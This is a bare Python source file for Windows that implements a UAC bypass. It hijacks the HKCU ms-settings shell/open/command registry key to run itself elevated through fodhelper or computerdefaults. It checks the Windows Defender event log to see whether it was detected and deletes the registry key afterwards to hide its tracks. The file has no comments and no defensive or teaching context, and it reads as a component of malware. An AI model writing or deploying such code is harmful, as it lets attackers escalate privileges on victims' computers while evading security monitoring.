import subprocess
import ctypes
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except:
        return False

def get_self():
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

def execute_command(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
    except:
        return None

def uac_bypass_method1():
    self_path, is_compiled = get_self()
    
    execute_command(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{self_path}" /f')
    execute_command('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
    
    log_count_before = 0
    result = execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text')
    if result:
        log_count_before = len(result.stdout)
    
    execute_command("computerdefaults --nouacbypass")
    
    log_count_after = 0
    result = execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text')
    if result:
        log_count_after = len(result.stdout)
    
    execute_command("reg delete hkcu\\Software\\Classes\\ms-settings /f")
    
    return log_count_after <= log_count_before

def uac_bypass_method2():
    self_path, is_compiled = get_self()
    
    execute_command(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{self_path}" /f')
    execute_command('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
    
    log_count_before = 0
    result = execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text')
    if result:
        log_count_before = len(result.stdout)
    
    execute_command("fodhelper --nouacbypass")
    
    log_count_after = 0
    result = execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text')
    if result:
        log_count_after = len(result.stdout)
    
    execute_command("reg delete hkcu\\Software\\Classes\\ms-settings /f")
    
    return log_count_after <= log_count_before

def attempt_uac_bypass():
    if is_admin():
        return True
    
    self_path, is_compiled = get_self()
    if not is_compiled:
        return False
    
    if uac_bypass_method1():
        return True
    
    if uac_bypass_method2():
        return True
    
    return False